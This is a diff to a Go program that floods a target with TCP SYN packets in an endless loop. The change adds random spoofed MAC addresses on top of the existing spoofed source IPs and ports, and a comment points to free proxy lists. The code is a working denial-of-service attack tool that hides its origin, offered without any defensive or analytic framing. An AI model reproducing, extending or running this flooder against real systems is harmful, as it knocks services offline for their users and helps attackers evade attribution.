@@ -34,6 +34,7 @@ func StartFlooding(dstIpStr string, dstPort, payloadLength int) {
 	payload := getRandomPayload(payloadLength)
 	srcIps := getIps()
 	srcPorts := getPorts()
+	macAddrs := getMacAddrs()
 
 	for {
 		// !!! https://www.devdungeon.com/content/packet-capture-injection-and-analysis-gopacket
@@ -47,7 +48,9 @@ func StartFlooding(dstIpStr string, dstPort, payloadLength int) {
 		// free proxies -> https://www.sslproxies.org/
 
 		ipPacket := buildIpPacket(srcIps[rand.Intn(len(srcIps))], dstIpStr)
-		tcpPacket := buildTcpPacket(int(srcPorts[rand.Intn(len(srcPorts))]), dstPort)
+		tcpPacket := buildTcpPacket(srcPorts[rand.Intn(len(srcPorts))], dstPort)
+		ethernetLayer := buildEthernetPacket(macAddrs[rand.Intn(len(macAddrs))], macAddrs[rand.Intn(len(macAddrs))])
+
 		err := tcpPacket.SetNetworkLayerForChecksum(ipPacket)
 		if err != nil {
 			panic(err)
@@ -72,7 +75,7 @@ func StartFlooding(dstIpStr string, dstPort, payloadLength int) {
 		}
 		tcpPayloadBuf := gopacket.NewSerializeBuffer()
 		payload := gopacket.Payload(payload)
-		err = gopacket.SerializeLayers(tcpPayloadBuf, opts, tcpPacket, payload)
+		err = gopacket.SerializeLayers(tcpPayloadBuf, opts, ethernetLayer, tcpPacket, payload)
 		if err != nil {
 			panic(err)
 		}
@@ -132,5 +135,12 @@ func buildTcpPacket(srcPort, dstPort int) *layers.TCP {
 		// Ack:     0,
 		SYN:     true,
 		ACK: 	 false,
+	}
+}
+
+func buildEthernetPacket(srcMac, dstMac []byte) *layers.Ethernet {
+	return &layers.Ethernet{
+		SrcMAC: net.HardwareAddr{srcMac[0], srcMac[1], srcMac[2], srcMac[3], srcMac[4], srcMac[5]},
+		DstMAC: net.HardwareAddr{dstMac[0], dstMac[1], dstMac[2], dstMac[3], dstMac[4], dstMac[5]},
 	}
 }
